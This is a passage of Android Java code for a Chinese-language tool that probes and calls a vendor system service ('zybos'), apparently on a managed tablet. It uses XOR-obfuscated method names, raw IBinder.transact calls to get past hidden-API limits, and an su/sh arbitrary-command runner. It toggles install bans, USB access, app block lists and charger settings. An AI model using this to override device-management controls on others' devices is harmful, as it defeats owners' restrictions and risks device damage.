                    public void run() {
                        Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x04, (byte)0x1e, (byte)0x24, (byte)0x03, (byte)0x29, (byte)0x03, (byte)0x09, (byte)0x21, (byte)0x04, (byte)0x1e, (byte)0x19}, (byte)0x6d), new Class[]{String.class}, pkg);
                        if (result != null) {
                            boolean val = (Boolean) result;
                            appendLog("[+] isInDndList(" + pkg + ") = " + val);
                            showResultDialog("勿扰列表检查", "包名: " + pkg + "\n在列表中: " + (val ? "是" : "否"));
                        } else {
                            showResultDialog("勿扰列表检查", "查询失败");
                        }
                    }
                });
            }
        });
    }

    // ==================== 分类8: 网络/DNS (Network/DNS) ====================

    // setZybOsDnsDotMode(int mode, String host) - 设置DNS DoT模式
    private void doSetZybOsDnsDotMode() {
        if (!checkAvailable()) return;
        final EditText modeInput = new EditText(this);
        modeInput.setHint("模式 (数字, 如 0/1/2)");
        modeInput.setText("0");
        final EditText hostInput = new EditText(this);
        hostInput.setHint("DNS主机 (如 dns.example.com)");

        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        lay.setPadding(48, 16, 48, 16);
        lay.addView(modeInput);
        lay.addView(hostInput);

        new AlertDialog.Builder(this)
            .setTitle("设置DNS DoT模式")
            .setView(lay)
            .setPositiveButton("设置", new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface d, int w) {
                    try {
                        int mode = Integer.parseInt(modeInput.getText().toString().trim());
                        String host = hostInput.getText().toString().trim();
                        tryInvoke(Obfuscator.dec(new byte[]{(byte)0xcf, (byte)0xd9, (byte)0xc8, (byte)0xe6, (byte)0xc5, (byte)0xde, (byte)0xf3, (byte)0xcf, (byte)0xf8, (byte)0xd2, (byte)0xcf, (byte)0xf8, (byte)0xd3, (byte)0xc8, (byte)0xf1, (byte)0xd3, (byte)0xd8, (byte)0xd9}, (byte)0xbc), new Class[]{Integer.TYPE, String.class}, mode, host);
                    } catch (NumberFormatException e) {
                        showSnack("模式必须为数字");
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    // getZybOsDnsDotMode() - 获取DNS DoT模式
    private void doGetZybOsDnsDotMode() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x32, (byte)0x30, (byte)0x21, (byte)0x0f, (byte)0x2c, (byte)0x37, (byte)0x1a, (byte)0x26, (byte)0x11, (byte)0x3b, (byte)0x26, (byte)0x11, (byte)0x3a, (byte)0x21, (byte)0x18, (byte)0x3a, (byte)0x31, (byte)0x30}, (byte)0x55), new Class[0]);
                if (result != null) {
                    int val = (Integer) result;
                    appendLog("[+] getZybOsDnsDotMode() = " + val);
                    showResultDialog("DNS模式", "模式: " + val);
                } else {
                    showResultDialog("DNS模式", "查询失败");
                }
            }
        });
    }

    // ==================== 分类9: 定时开关机 (Power Timer) ====================

    // updatePowerOnTime(int hour, int minute) - 设置定时开机
    private void doUpdatePowerOnTime() {
        if (!checkAvailable()) return;
        final EditText hourInput = new EditText(this);
        hourInput.setHint("小时 (0-23)");
        hourInput.setText("7");
        final EditText minInput = new EditText(this);
        minInput.setHint("分钟 (0-59)");
        minInput.setText("0");

        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        lay.setPadding(48, 16, 48, 16);
        lay.addView(hourInput);
        lay.addView(minInput);

        new AlertDialog.Builder(this)
            .setTitle("设置定时开机")
            .setView(lay)
            .setPositiveButton("设置", new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface d, int w) {
                    try {
                        int hour = Integer.parseInt(hourInput.getText().toString().trim());
                        int minute = Integer.parseInt(minInput.getText().toString().trim());
                        tryInvoke(Obfuscator.dec(new byte[]{(byte)0xef, (byte)0xea, (byte)0xfe, (byte)0xfb, (byte)0xee, (byte)0xff, (byte)0xca, (byte)0xf5, (byte)0xed, (byte)0xff, (byte)0xe8, (byte)0xd5, (byte)0xf4, (byte)0xce, (byte)0xf3, (byte)0xf7, (byte)0xff}, (byte)0x9a), new Class[]{Integer.TYPE, Integer.TYPE}, hour, minute);
                    } catch (NumberFormatException e) {
                        showSnack("请输入数字");
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    // sendLowChargingNotification() - 发送低电量充电通知
    private void doSendLowChargingNotification() {
        if (!checkAvailable()) return;
        tryInvoke("sendLowChargingNotification", new Class[0]);
    }

    // cancelLowChargingNotification() - 取消低电量充电通知
    private void doCancelLowChargingNotification() {
        if (!checkAvailable()) return;
        tryInvoke("cancelLowChargingNotification", new Class[0]);
    }

    // ==================== 分类10: 进程管理 (Process Management, zybos_process) ====================

    // forceStopPackage(String) - 强制停止应用
    private void doForceStopPackage() {
        if (!checkProcessAvailable()) return;
        showInputDialog("强制停止应用", "输入包名", null, new OnInputListener() {
            @Override public void onInput(String pkg) {
                if (pkg.isEmpty()) return;
                tryInvokeProcess("forceStopPackage", new Class[]{String.class}, pkg);
            }
        });
    }

    // inWhiteList(String) - 查询是否在白名单
    private void doInWhiteList() {
        if (!checkProcessAvailable()) return;
        showInputDialog("查询白名单", "输入包名", null, new OnInputListener() {
            @Override public void onInput(String pkg) {
                if (pkg.isEmpty()) return;
                tryInvokeProcessGet("inWhiteList", new Class[]{String.class}, pkg);
            }
        });
    }

    // ==================== Root命令执行 ====================

    private void execRoot(String cmd) {
        // 先尝试 root (su), 失败则尝试非root (sh)
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                appendLog("  " + line);
            }
            BufferedReader err = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = err.readLine()) != null) {
                appendLog("  [err] " + line);
            }
            int exit = p.waitFor();
            if (exit == 0) {
                appendLog("[*] exit=" + exit);
                return;
            }
            appendLog("[*] su exit=" + exit + ", 尝试非root执行...");
        } catch (Exception e) {
            appendLog("[*] su不可用, 尝试非root执行...");
        }
        // 非root回退
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                appendLog("  " + line);
            }
            BufferedReader err = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = err.readLine()) != null) {
                appendLog("  [err] " + line);
            }
            int exit = p.waitFor();
            appendLog("[*] exit=" + exit + " (非root)");
        } catch (Exception e) {
            appendLog("[!] execRoot 失败: " + e.getMessage());
        }
    }

    private String execRootCapture(String cmd) {
        // 先尝试 root
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            int exit = p.waitFor();
            if (exit == 0) return sb.toString().trim();
        } catch (Exception e) {
            // 继续尝试非root
        }
        // 非root回退
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            p.waitFor();
            return sb.toString().trim();
        } catch (Exception e) {
            return "错误: " + e.getMessage();
        }
    }

    // ==================== 快捷方式 / Intent ====================

    private void doOpenShortcut() {
        startActivity(new Intent(this, AppLauncherActivity.class));
    }

    private void doIntentOpen() {
        final EditText input = new EditText(this);
        input.setHint("输入包名，如 com.tencent.mm");
        input.setPadding(48, 32, 48, 32);

        new AlertDialog.Builder(this)
            .setTitle("Intent 打开应用")
            .setMessage("输入应用包名，将启动该应用的主Activity")
            .setView(input)
            .setPositiveButton("打开", new android.content.DialogInterface.OnClickListener() {
                @Override
                public void onClick(android.content.DialogInterface dialog, int which) {
                    String pkg = input.getText().toString().trim();
                    if (pkg.isEmpty()) {
                        showSnack("请输入包名");
                        return;
                    }
                    try {
                        Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
                        if (intent != null) {
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(intent);
                            showResultDialog("Intent 打开", "已启动: " + pkg);
                        } else {
                            showResultDialog("Intent 打开", "未找到应用: " + pkg + "\n或该应用无可启动Activity");
                        }
                    } catch (Exception e) {
                        showResultDialog("Intent 打开", "启动失败: " + e.getMessage());
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    // ==================== 辅助方法 ====================

    private String computeFileMd5(File file) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            InputStream is = new FileInputStream(file);
            byte[] buf = new byte[8192];
            int n;
            while ((n = is.read(buf)) > 0) {
                md.update(buf, 0, n);
            }
            is.close();
            byte[] digest = md.digest();
            StringBuilder hex = new StringBuilder();
            for (byte b : digest) {
                hex.append(String.format("%02x", b & 0xff));
            }
            return hex.toString();
        } catch (Exception e) {
            return "";
        }
    }

    private String formatFileSize(long bytes) {
        if (bytes < 1024) return bytes + "B";
        if (bytes < 1024 * 1024) return String.format("%.1fKB", bytes / 1024.0);
        if (bytes < 1024 * 1024 * 1024) return String.format("%.1fMB", bytes / (1024.0 * 1024.0));
        return String.format("%.2fGB", bytes / (1024.0 * 1024.0 * 1024.0));
    }

    private String copyContentUriToLocal(Uri uri) {
        if (uri == null) return null;
        InputStream in = null;
        FileOutputStream fost = null;
        try {
            in = getContentResolver().openInputStream(uri);
            if (in == null) return null;
            File tmp = new File(getCacheDir(), "jc_local_" + System.currentTimeMillis() + ".apk");
            fost = new FileOutputStream(tmp);
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) fost.write(buf, 0, n);
            fost.flush();
            return tmp.getAbsolutePath();
        } catch (Exception e) {
            appendLog("[!] copyContentUriToLocal failed: " + e.getMessage());
            return null;
        } finally {
            if (in != null) try { in.close(); } catch (Exception ignored) { }
            if (fost != null) try { fost.close(); } catch (Exception ignored) { }
        }
    }

    // ==================== Transact 直接调用方案 (免 Hidden API bypass) ====================

    /**
     * 使用 IBinder.transact() 直接调用，完全绕过 Hidden API 限制。
     * 因为 IBinder.transact() 是公开 API，不需要 setHiddenApiExemptions。
     */
    private boolean transactCall(int code, String descriptor, Parcel data, Parcel reply) {
        if (zybosBinder == null) {
            appendLog("[!] Binder 未获取，请先检测服务");
            return false;
        }
        try {
            return zybosBinder.transact(code, data, reply, 0);
        } catch (Throwable e) {
            appendLog("[!] transact 失败: " + (e.getMessage() != null ? e.getMessage() : e.getClass().getSimpleName()));
            return false;
        }
    }

    // ==================== 新增事务码方法 (来自 framework 反编译) ====================

    // setInstallPackageDisallow(boolean) - 0x06 设置安装禁止
    private void doSetInstallPackageDisallow() {
        if (!checkAvailable()) return;
        new AlertDialog.Builder(this)
            .setTitle("设置安装禁止")
            .setItems(new String[]{"禁止安装", "允许安装"}, new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface d, int w) {
                    tryInvoke(Obfuscator.dec(new byte[]{(byte)0x27, (byte)0x31, (byte)0x20, (byte)0x1d, (byte)0x3a, (byte)0x27, (byte)0x20, (byte)0x35, (byte)0x38, (byte)0x38, (byte)0x04, (byte)0x35, (byte)0x37, (byte)0x3f, (byte)0x35, (byte)0x33, (byte)0x31, (byte)0x10, (byte)0x3d, (byte)0x27, (byte)0x35, (byte)0x38, (byte)0x38, (byte)0x3b, (byte)0x23}, (byte)0x54), new Class[]{Boolean.TYPE}, w == 0);
                }
            })
            .show();
    }

    // setPackageListDisallow(List) - 0x04 设置禁止包名列表
    private void doSetPackageListDisallow() {
        if (!checkAvailable()) return;
        showInputDialog("设置禁止包名列表", "输入包名(逗号分隔)", null, new OnInputListener() {
            @Override public void onInput(String val) {
                List<String> list = new ArrayList<>();
                for (String s : val.split(",")) {
                    String t = s.trim();
                    if (!t.isEmpty()) list.add(t);
                }
                tryInvoke(Obfuscator.dec(new byte[]{(byte)0x56, (byte)0x40, (byte)0x51, (byte)0x75, (byte)0x44, (byte)0x46, (byte)0x4e, (byte)0x44, (byte)0x42, (byte)0x40, (byte)0x69, (byte)0x4c, (byte)0x56, (byte)0x51, (byte)0x61, (byte)0x4c, (byte)0x56, (byte)0x44, (byte)0x49, (byte)0x49, (byte)0x4a, (byte)0x52}, (byte)0x25), new Class[]{List.class}, list);
            }
        });
    }

    // setClassListDisallow(List) - 0x05 设置禁止类名列表
    private void doSetClassListDisallow() {
        if (!checkAvailable()) return;
        showInputDialog("设置禁止类名列表", "输入类名(逗号分隔)", null, new OnInputListener() {
            @Override public void onInput(String val) {
                List<String> list = new ArrayList<>();
                for (String s : val.split(",")) {
                    String t = s.trim();
                    if (!t.isEmpty()) list.add(t);
                }
                tryInvoke(Obfuscator.dec(new byte[]{(byte)0xed, (byte)0xfb, (byte)0xea, (byte)0xdd, (byte)0xf2, (byte)0xff, (byte)0xed, (byte)0xed, (byte)0xd2, (byte)0xf7, (byte)0xed, (byte)0xea, (byte)0xda, (byte)0xf7, (byte)0xed, (byte)0xff, (byte)0xf2, (byte)0xf2, (byte)0xf1, (byte)0xe9}, (byte)0x9e), new Class[]{List.class}, list);
            }
        });
    }

    // setUSBDisallow(boolean) - 0x16 设置USB禁止
    private void doSetUSBDisallow() {
        if (!checkAvailable()) return;
        new AlertDialog.Builder(this)
            .setTitle("设置USB禁止")
            .setItems(new String[]{"禁止USB", "允许USB"}, new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface d, int w) {
                    tryInvoke(Obfuscator.dec(new byte[]{(byte)0xf5, (byte)0xe3, (byte)0xf2, (byte)0xd3, (byte)0xd5, (byte)0xc4, (byte)0xc2, (byte)0xef, (byte)0xf5, (byte)0xe7, (byte)0xea, (byte)0xea, (byte)0xe9, (byte)0xf1}, (byte)0x86), new Class[]{Boolean.TYPE}, w == 0);
                }
            })
            .show();
    }

    // setDisplayDaltonizerEnabled(boolean) - 0x23 色彩校正开关
    private void doSetDisplayDaltonizerEnabled() {
        if (!checkAvailable()) return;
        new AlertDialog.Builder(this)
            .setTitle("色彩校正开关")
            .setItems(new String[]{"开启色彩校正", "关闭色彩校正"}, new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface d, int w) {
                    tryInvoke(Obfuscator.dec(new byte[]{(byte)0x38, (byte)0x2e, (byte)0x3f, (byte)0x0f, (byte)0x22, (byte)0x38, (byte)0x3b, (byte)0x27, (byte)0x2a, (byte)0x32, (byte)0x0f, (byte)0x2a, (byte)0x27, (byte)0x3f, (byte)0x24, (byte)0x25, (byte)0x22, (byte)0x31, (byte)0x2e, (byte)0x39, (byte)0x0e, (byte)0x25, (byte)0x2a, (byte)0x29, (byte)0x27, (byte)0x2e, (byte)0x2f}, (byte)0x4b), new Class[]{Boolean.TYPE}, w == 0);
                }
            })
            .show();
    }

    // isInDisplayDaltonizerMode() - 0x24 查询色彩校正状态
    private void doIsInDisplayDaltonizerMode() {
        if (!checkAvailable()) return;
        tryInvokeGet(Obfuscator.dec(new byte[]{(byte)0xbf, (byte)0xa5, (byte)0x9f, (byte)0xb8, (byte)0x92, (byte)0xbf, (byte)0xa5, (byte)0xa6, (byte)0xba, (byte)0xb7, (byte)0xaf, (byte)0x92, (byte)0xb7, (byte)0xba, (byte)0xa2, (byte)0xb9, (byte)0xb8, (byte)0xbf, (byte)0xac, (byte)0xb3, (byte)0xa4, (byte)0x9b, (byte)0xb9, (byte)0xb2, (byte)0xb3}, (byte)0xd6), new Class[0]);
    }

    // setStylusEnabled(boolean) - 0x26 触控笔开关
    private void doSetStylusEnabled() {
        if (!checkAvailable()) return;
        new AlertDialog.Builder(this)
            .setTitle("触控笔开关")
            .setItems(new String[]{"开启触控笔", "关闭触控笔"}, new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface d, int w) {
                    tryInvoke(Obfuscator.dec(new byte[]{(byte)0x56, (byte)0x40, (byte)0x51, (byte)0x76, (byte)0x51, (byte)0x5c, (byte)0x49, (byte)0x50, (byte)0x56, (byte)0x60, (byte)0x4b, (byte)0x44, (byte)0x47, (byte)0x49, (byte)0x40, (byte)0x41}, (byte)0x25), new Class[]{Boolean.TYPE}, w == 0);
                }
            })
            .show();
    }

    // setMtkPQColorTemperatureEnable(boolean) - 0x28 MTK色温开关
    private void doSetMtkPQColorTemperatureEnable() {
        if (!checkAvailable()) return;
        new AlertDialog.Builder(this)
            .setTitle("MTK色温开关")
            .setItems(new String[]{"开启MTK色温", "关闭MTK色温"}, new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface d, int w) {
                    tryInvoke(Obfuscator.dec(new byte[]{(byte)0x3f, (byte)0x29, (byte)0x38, (byte)0x01, (byte)0x38, (byte)0x27, (byte)0x1c, (byte)0x1d, (byte)0x0f, (byte)0x23, (byte)0x20, (byte)0x23, (byte)0x3e, (byte)0x18, (byte)0x29, (byte)0x21, (byte)0x3c, (byte)0x29, (byte)0x3e, (byte)0x2d, (byte)0x38, (byte)0x39, (byte)0x3e, (byte)0x29, (byte)0x09, (byte)0x22, (byte)0x2d, (byte)0x2e, (byte)0x20, (byte)0x29}, (byte)0x4c), new Class[]{Boolean.TYPE}, w == 0);
                }
            })
            .show();
    }

    // setMtkPQGammaIndex(int) - 0x29 设置Gamma索引
    private void doSetMtkPQGammaIndex() {
        if (!checkAvailable()) return;
        showInputDialog("设置Gamma索引", "输入索引值(数字)", "0", new OnInputListener() {
            @Override public void onInput(String val) {
                try {
                    int idx = Integer.parseInt(val);
                    tryInvoke(Obfuscator.dec(new byte[]{(byte)0x9d, (byte)0x8b, (byte)0x9a, (byte)0xa3, (byte)0x9a, (byte)0x85, (byte)0xbe, (byte)0xbf, (byte)0xa9, (byte)0x8f, (byte)0x83, (byte)0x83, (byte)0x8f, (byte)0xa7, (byte)0x80, (byte)0x8a, (byte)0x8b, (byte)0x96}, (byte)0xee), new Class[]{Integer.TYPE}, idx);
                } catch (NumberFormatException e) {
                    showSnack("请输入数字");
                }
            }
        });
    }

    // getMtkPQGammaDefaultValue() - 0x2a 获取Gamma默认值
    private void doGetMtkPQGammaDefaultValue() {
        if (!checkAvailable()) return;
        tryInvokeGet(Obfuscator.dec(new byte[]{(byte)0x4d, (byte)0x4f, (byte)0x5e, (byte)0x67, (byte)0x5e, (byte)0x41, (byte)0x7a, (byte)0x7b, (byte)0x6d, (byte)0x4b, (byte)0x47, (byte)0x47, (byte)0x4b, (byte)0x6e, (byte)0x4f, (byte)0x4c, (byte)0x4b, (byte)0x5f, (byte)0x46, (byte)0x5e, (byte)0x7c, (byte)0x4b, (byte)0x46, (byte)0x5f, (byte)0x4f}, (byte)0x2a), new Class[0]);
    }

    // getMtkPQGammaMinValue() - 0x2b 获取Gamma最小值
    private void doGetMtkPQGammaMinValue() {
        if (!checkAvailable()) return;
        tryInvokeGet(Obfuscator.dec(new byte[]{(byte)0x15, (byte)0x17, (byte)0x06, (byte)0x3f, (byte)0x06, (byte)0x19, (byte)0x22, (byte)0x23, (byte)0x35, (byte)0x13, (byte)0x1f, (byte)0x1f, (byte)0x13, (byte)0x3f, (byte)0x1b, (byte)0x1c, (byte)0x24, (byte)0x13, (byte)0x1e, (byte)0x07, (byte)0x17}, (byte)0x72), new Class[0]);
    }

    // getMtkPQGammaMaxValue() - 0x2c 获取Gamma最大值
    private void doGetMtkPQGammaMaxValue() {
        if (!checkAvailable()) return;
        tryInvokeGet(Obfuscator.dec(new byte[]{(byte)0x3f, (byte)0x3d, (byte)0x2c, (byte)0x15, (byte)0x2c, (byte)0x33, (byte)0x08, (byte)0x09, (byte)0x1f, (byte)0x39, (byte)0x35, (byte)0x35, (byte)0x39, (byte)0x15, (byte)0x39, (byte)0x20, (byte)0x0e, (byte)0x39, (byte)0x34, (byte)0x2d, (byte)0x3d}, (byte)0x58), new Class[0]);
    }

    // getMtkPQGammaCurrentValue() - 0x2d 获取Gamma当前值
    private void doGetMtkPQGammaCurrentValue() {
        if (!checkAvailable()) return;
        tryInvokeGet(Obfuscator.dec(new byte[]{(byte)0xe2, (byte)0xe0, (byte)0xf1, (byte)0xc8, (byte)0xf1, (byte)0xee, (byte)0xd5, (byte)0xd4, (byte)0xc2, (byte)0xe4, (byte)0xe8, (byte)0xe8, (byte)0xe4, (byte)0xc6, (byte)0xf0, (byte)0xf7, (byte)0xf7, (byte)0xe0, (byte)0xeb, (byte)0xf1, (byte)0xd3, (byte)0xe4, (byte)0xe9, (byte)0xf0, (byte)0xe0}, (byte)0x85), new Class[0]);
    }

    // getChargerAgingCV() - 0x2e 获取充电器老化CV
    private void doGetChargerAgingCV() {
        if (!checkAvailable()) return;
        tryInvokeGet(Obfuscator.dec(new byte[]{(byte)0xd4, (byte)0xd6, (byte)0xc7, (byte)0xf0, (byte)0xdb, (byte)0xd2, (byte)0xc1, (byte)0xd4, (byte)0xd6, (byte)0xc1, (byte)0xf2, (byte)0xd4, (byte)0xda, (byte)0xdd, (byte)0xd4, (byte)0xf0, (byte)0xe5}, (byte)0xb3), new Class[0]);
    }

    // setChargerAgingCV(int) - 0x2f 设置充电器老化CV
    private void doSetChargerAgingCV() {
        if (!checkAvailable()) return;
        showInputDialog("设置充电器老化CV", "输入CV值(数字)", "0", new OnInputListener() {
            @Override public void onInput(String val) {
                try {
                    int cv = Integer.parseInt(val);
                    tryInvoke(Obfuscator.dec(new byte[]{(byte)0x95, (byte)0x83, (byte)0x92, (byte)0xa5, (byte)0x8e, (byte)0x87, (byte)0x94, (byte)0x81, (byte)0x83, (byte)0x94, (byte)0xa7, (byte)0x81, (byte)0x8f, (byte)0x88, (byte)0x81, (byte)0xa5, (byte)0xb0}, (byte)0xe6), new Class[]{Integer.TYPE}, cv);
                } catch (NumberFormatException e) {
                    showSnack("请输入数字");
                }
            }
        });
    }

    // setChargerIeoc(int) - 0x30 设置充电截止电流
    private void doSetChargerIeoc() {
        if (!checkAvailable()) return;
        showInputDialog("设置充电截止电流", "输入Ieoc值(数字, mA)", "100", new OnInputListener() {
            @Override public void onInput(String val) {
                try {
                    int ieoc = Integer.parseInt(val);
                    tryInvoke(Obfuscator.dec(new byte[]{(byte)0x1d, (byte)0x0b, (byte)0x1a, (byte)0x2d, (byte)0x06, (byte)0x0f, (byte)0x1c, (byte)0x09, (byte)0x0b, (byte)0x1c, (byte)0x27, (byte)0x0b, (byte)0x01, (byte)0x0d}, (byte)0x6e), new Class[]{Integer.TYPE}, ieoc);
                } catch (NumberFormatException e) {
                    showSnack("请输入数字");
                }
            }
        });
    }

    /**
     * 【已禁用】遍历探测事务码会导致设备重启等严重后果。
     * 某些事务码对应 reboot/shutdown 等危险操作，不能盲测。
     * 如需调用，请使用 doManualTransact() 手动输入已知的事务码。
     */
    private void doTransactProbe() {
        appendLog("[!] 遍历探测已禁用: 盲测事务码会触发 reboot 等危险操作导致设备重启");
        appendLog("[!] 如需调用，请使用[手动调用]输入已知的安全事务码");
        showSnack("遍历探测已禁用，请用手动调用");
    }

    /**
     * 手动执行 transact 调用（高级用法）
     * 用户可以输入事务码，直接发送 transact。
     * 注意: 某些事务码可能导致设备重启，请确认事务码安全后再调用。
     */
    private void doManualTransact() {
        if (zybosBinder == null) {
            appendLog("[!] Binder 未获取");
            showSnack("请先检测服务");
            return;
        }
        final EditText input = new EditText(this);
        input.setHint("输入事务码 (如 1, 2, 3...)");
        input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);

        new AlertDialog.Builder(this)
            .setTitle("手动 Transact 调用")
            .setMessage("输入事务码，直接调用 IBinder.transact()\n\n" +
                "⚠ 警告: 某些事务码可能触发重启/关机等危险操作\n" +
                "⚠ 请确认事务码安全后再调用")
            .setView(input)
            .setPositiveButton("调用", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    String val = input.getText().toString().trim();
                    if (val.isEmpty()) return;
                    try {
                        final int code = Integer.parseInt(val);
                        // 二次确认
                        new AlertDialog.Builder(ZybosToolsActivity.this)
                            .setTitle("确认调用")
                            .setMessage("即将执行 transact(" + code + ")\n\n" +
                                "确定要继续吗？")
                            .setPositiveButton("确认调用", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface d2, int w2) {
                                    appendLog("[*] 手动 transact: code=" + code);
                                    runAsync(new Runnable() {
                                        @Override
                                        public void run() {
                                            Parcel data = Parcel.obtain();
                                            Parcel reply = Parcel.obtain();
                                            try {
                                                data.writeInterfaceToken(Obfuscator.dec3(new byte[]{(byte)0xa9, (byte)0xd9, (byte)0xa0, (byte)0xba, (byte)0xd8, (byte)0xad, (byte)0xac, (byte)0x99, (byte)0xab, (byte)0xbb, (byte)0x99, (byte)0x8d, (byte)0x92, (byte)0xce, (byte)0xa6, (byte)0xa7, (byte)0xc4, (byte)0x97, (byte)0xb1, (byte)0xc4, (byte)0x85, (byte)0xb8, (byte)0xde, (byte)0x89, (byte)0xa9, (byte)0xd9, (byte)0xa5, (byte)0xaf, (byte)0xd2, (byte)0xb6}, (byte)0xc8, (byte)0xb7, (byte)0xc4));
                                                // 事务码是绝对值(来自framework反编译), 直接使用
                                                boolean ok = zybosBinder.transact(code, data, reply, 0);
                                                if (ok) {
                                                    int exCode = reply.readInt();
                                                    if (exCode == 0) {
                                                        appendLog("[+] transact(" + code + ") 成功");
                                                        try {
                                                            int replyInt = reply.readInt();
                                                            appendLog("[+] 返回值(int): " + replyInt);
                                                        } catch (Throwable t) {
                                                            // 不是 int 返回值
                                                        }
                                                    } else {
                                                        appendLog("[!] transact(" + code + ") 服务端异常: " + exCode);
                                                    }
                                                } else {
                                                    appendLog("[!] transact(" + code + ") 失败");
                                                }
                                            } catch (Throwable e) {
                                                appendLog("[!] transact 异常: " + (e.getMessage() != null ? e.getMessage() : e.getClass().getSimpleName()));
                                            } finally {
                                                data.recycle();
                                                reply.recycle();
                                            }
                                        }
                                    });
                                }
                            })
                            .setNegativeButton("取消", null)
                            .show();
                    } catch (NumberFormatException e) {
                        showSnack("请输入数字");
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    // ==================== 辅助方法 ====================

    private void showSnack(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }

    private void appendLog(String msg) {
        String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        String line = "[" + time + "] " + msg;
        synchronized (logHistory) {
            logHistory.add(line);
            if (logHistory.size() > MAX_LOG_LINES) {
                logHistory.remove(0);
            }
        }
        updateLogDisplay();
    }

    private void updateLogDisplay() {
        if (logText == null) return;
        final StringBuilder sb = new StringBuilder();
        synchronized (logHistory) {
            for (String line : logHistory) {
                sb.append(line).append("\n");
            }
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (logText != null) {
                    logText.setText(sb.toString());
                    if (logScroll != null) {
                        logScroll.post(new Runnable() {
                            @Override public void run() {
                                logScroll.fullScroll(ScrollView.FOCUS_DOWN);
                            }
                        });
                    }
                }
            }
        });
    }

    private void toggleLogPanel() {
        logPanelVisible = !logPanelVisible;
        if (logPanel != null) {
            logPanel.setVisibility(logPanelVisible ? View.VISIBLE : View.GONE);
        }
        if (logPanelVisible) {
            updateLogDisplay();
        }
    }

    private void showLogDialog() {
        final StringBuilder sb = new StringBuilder();
        synchronized (logHistory) {
            for (String line : logHistory) {
                sb.append(line).append("\n");
            }
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                ScrollView scroll = new ScrollView(ZybosToolsActivity.this);
                TextView tv = new TextView(ZybosToolsActivity.this);
                tv.setText(sb.toString());
                tv.setTextIsSelectable(true);
                tv.setPadding(24, 16, 24, 16);
                scroll.addView(tv);
                new AlertDialog.Builder(ZybosToolsActivity.this)
                    .setTitle("执行日志")
                    .setView(scroll)
                    .setPositiveButton("清空日志", new DialogInterface.OnClickListener() {
                        @Override public void onClick(DialogInterface d, int w) {
                            synchronized (logHistory) {
                                logHistory.clear();
                            }
                        }
                    })
                    .setNegativeButton("关闭", null)
                    .show();
            }
        });
    }

    private void showResultDialog(final String title, final String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                new AlertDialog.Builder(ZybosToolsActivity.this)
                    .setTitle(title)
                    .setMessage(message)
                    .setPositiveButton("确定", null)
                    .show();
            }
        });
    }

    // ==================== 分类11: 框架新发现接口 ====================

    // CapCtrl - 探测MTK能力控制服务
    private void doCapCtrlDetect() {
        appendLog("---------- CapCtrl服务探测 ----------");
        appendLog("接口: com.mediatek.capctrl.aidl.IMtkCapCtrl");
        appendLog("方法: enableCapabaility, routeAuthMessage, routeCertificate, abortCertificate");

        runAsync(new Runnable() {
            @Override
            public void run() {
                // 尝试多个可能的服务名
                String[] possibleNames = {"capctrl", "mtk_capctrl", "capability", "CapCtrl"};
                for (String name : possibleNames) {
                    try {
                        Class<?> smCls = Class.forName("android.os.ServiceManager");
                        Method getSvc = smCls.getMethod("getService", String.class);
                        // 对于Android 8+，也需要尝试getDeclaredService
                        IBinder binder = (IBinder) getSvc.invoke(null, name);
                        if (binder != null) {
                            appendLog("✓ 发现服务: " + name + " -> " + binder);
                            appendLog("  接口描述符: " + binder.getInterfaceDescriptor());
                            // 尝试ping
                            try {
                                boolean ping = binder.pingBinder();
                                appendLog("  Ping: " + (ping ? "成功" : "失败"));
                            } catch (Throwable e) {
                                appendLog("  Ping失败: " + e.getMessage());
                            }
                            // 尝试获取DESCRIPTOR
                            try {
                                String desc = binder.getInterfaceDescriptor();
                                appendLog("  DESCRIPTOR: " + desc);
                            } catch (Throwable e) {
                                appendLog("  获取DESCRIPTOR失败: " + e.getMessage());
                            }
